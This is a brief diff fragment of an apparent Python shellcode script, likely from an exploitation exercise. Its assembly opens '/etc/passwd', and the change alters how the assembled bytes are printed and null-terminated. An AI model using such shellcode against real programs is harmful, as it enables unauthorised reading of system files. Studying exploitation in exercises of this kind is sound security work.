@@ -46,4 +46,4 @@ setra:
 	call open
 	.string	"/etc/passwd"
 '''
-print (asm(sc))
+print (asm(sc))[:-1]+'\x00'
